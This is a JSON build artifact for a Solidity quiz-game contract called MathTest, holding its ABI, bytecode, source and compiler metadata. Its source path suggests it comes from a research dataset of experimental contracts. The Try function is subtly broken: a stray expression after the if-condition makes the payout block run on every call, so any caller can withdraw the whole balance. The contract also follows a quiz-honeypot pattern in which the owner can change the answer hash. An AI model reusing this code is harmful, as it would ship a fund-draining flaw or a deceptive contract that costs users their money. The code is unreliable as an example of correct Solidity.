{
  "contractName": "MathTest",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "minBet",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "Try",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_response",
          "type": "string"
        },
        {
          "name": "_count",
          "type": "uint256"
        }
      ],
      "name": "start_quiz_game",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "StopGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "NewQuestion",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "newAddress",
          "type": "address"
        }
      ],
      "name": "newQuestioner",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040523073ffffffffffffffffffffffffffffffffffffffff163160015534801561002b57600080fd5b506108c88061003b6000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680632f092a3f146100855780633853682c146101315780633e3ee8591461015f5780633fad9ae0146101c957806359988dce146102595780639619367d1461029c578063f50ab247146102c7575b005b61012f600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001909291905050506102d1565b005b61015d600480360381019080803590602001908201803590602001919091929391929390505050610421565b005b6101c7600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192908035600019169060200190929190505050610575565b005b3480156101d557600080fd5b506101de6105f7565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561021e578082015181840152602081019050610203565b50505050905090810190601f16801561024b5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561026557600080fd5b5061029a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610695565b005b3480156102a857600080fd5b506102b1610735565b6040518082815260200191505060405180910390f35b6102cf61073b565b005b600060010260035460001916141561041c57816040516020018082805190602001908083835b60208310151561031c57805182526020820191506020810190506020830392506102f7565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040516020818303038152906040526040518082805190602001908083835b6020831015156103855780518252602082019150602081019050602083039250610360565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390206003816000191690555082600090805190602001906103d29291906107f7565b508060048190555033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b505050565b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561045b57600080fd5b8181604051602001808383808284378201915050925050506040516020818303038152906040526040518082805190602001908083835b6020831015156104b75780518252602082019150602081019050602083039250610492565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600019166003546000191614801561051257503073ffffffffffffffffffffffffffffffffffffffff163134115b503373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610570573d6000803e3d6000fd5b505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156105d157600080fd5b81600090805190602001906105e79291906107f7565b5080600381600019169055505050565b60008054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561068d5780601f106106625761010080835404028352916020019161068d565b820191906000526020600020905b81548152906001019060200180831161067057829003601f168201915b505050505081565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156106f157600080fd5b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60015481565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561079757600080fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156107f4573d6000803e3d6000fd5b50565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061083857805160ff1916838001178555610866565b82800160010185558215610866579182015b8281111561086557825182559160200191906001019061084a565b5b5090506108739190610877565b5090565b61089991905b8082111561089557600081600090555060010161087d565b5090565b905600a165627a7a7230582036aff34836c0b978e30e3346b4784d2f9f911c63b9dbb4548bf6ddfac19209590029",
  "source": "\n\ncontract MathTest\n{\n    function Try(string _response) external payable {\n        require(msg.sender == tx.origin);\n        \n        if(responseHash == keccak256(abi.encodePacked(_response)) && msg.value>address(this).balance)-msg.value;\n        {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n\n    string public question;\n    uint256 public minBet = address(this).balance;\n    \n    address questionSender;\n    \n    bytes32 responseHash;\n \n    uint count;\n    \n    function start_quiz_game(string _question,string _response, uint _count) public payable {\n        if(responseHash==0x0) \n        {\n            responseHash = keccak256(abi.encodePacked(_response));\n            question = _question;\n            count = _count;\n            questionSender = msg.sender;\n        }\n    }\n    \n    function StopGame() public payable onlyQuestionSender {\n       msg.sender.transfer(address(this).balance);\n    }\n    \n    function NewQuestion(string _question, bytes32 _responseHash) public payable onlyQuestionSender {\n        question = _question;\n        responseHash = _responseHash;\n    }\n    \n    function newQuestioner(address newAddress) public onlyQuestionSender{\n        questionSender = newAddress;\n    }\n    \n    modifier onlyQuestionSender(){\n        require(msg.sender==questionSender);\n        _;\n    }\n    \n    function() public payable{}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0xdeff1d547f5cf673b03edcdfb2a80341a42d7f38/contracts/0xdeff1d547f5cf673b03edcdfb2a80341a42d7f38.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T04:08:46.814Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}